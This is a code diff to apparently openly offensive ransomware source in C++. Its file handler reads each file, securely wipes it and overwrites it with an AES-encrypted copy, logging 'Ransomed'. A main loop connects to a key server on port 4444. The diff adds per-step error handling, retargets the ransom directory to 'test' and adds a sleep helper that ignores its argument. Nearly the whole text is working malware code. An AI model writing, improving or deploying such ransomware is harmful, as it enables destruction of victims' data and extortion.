@@ -1,29 +1,53 @@
 #include "crypto.hpp"
 #include "cryptopp/socketft.h"
+#include "file.hpp"
 #include <iostream>
 #include <string>
+#include <time.h>
 #include "traverse.hpp"
-#include "file.hpp"
 
 std::string addr("127.0.0.1");
 size_t port=4444;
-std::string ransom_directory(".");
+std::string ransom_directory("test");
 
-//Custom file handler...
+int cross_platform_sleep(long seconds)
+{
+	timespec tt0,tt1;
+	tt0.tv_sec=1;
+	tt0.tv_nsec=0;
+	return nanosleep(&tt0,&tt1);
+}
+
 void file_handler(const std::string& filepath,const std::string& key,const std::string& iv)
 {
 	try
 	{
 		aes_t aes(key,iv);
 		std::string plain;
-		if(file_to_string(filepath,plain)&&spc_file_wipe(filepath)&&string_to_file(aes.encrypt(plain),filepath))
-			std::cout<<"Ransomed "<<filepath<<std::endl;
-		else
-			std::cout<<"Error "<<filepath<<std::endl;
+		if(!file_to_string(filepath,plain))
+		{
+			std::cout<<"Skipping "<<filepath<<" - Could not read file."<<std::endl;
+			return;
+		}
+		if(!spc_file_wipe(filepath))
+		{
+			std::cout<<"Skipping "<<filepath<<" - Could not erase."<<std::endl;
+			return;
+		}
+		if(!string_to_file(aes.encrypt(plain),filepath))
+		{
+			std::cout<<"Skipping "<<filepath<<" - Could not write file."<<std::endl;
+			return;
+		}
+		std::cout<<"Ransomed "<<filepath<<std::endl;
+	}
+	catch(std::exception& error)
+	{
+		std::cout<<"Skipping "<<filepath<<" - "<<error.what()<<std::endl;
 	}
 	catch(...)
 	{
-		std::cout<<"Skipping "<<filepath<<std::endl;
+		std::cout<<"Skipping "<<filepath<<" - Unknown error."<<std::endl;
 	}
 }
 
@@ -36,7 +60,7 @@ int main()
 	{
 		try
 		{
-			std::cout<<"Connected to "<<addr<<":"<<port<<"."<<std::endl;
+			std::cout<<"Connecting to "<<addr<<":"<<port<<"."<<std::endl;
 			try
 			{
 				client.Connect(addr.c_str(),port);
@@ -85,6 +109,7 @@ int main()
 		{
 			std::cout<<error.what()<<std::endl;
 		}
+		cross_platform_sleep(1);
 	}
 	client.CloseSocket();
 	CryptoPP::Socket::ShutdownSockets();
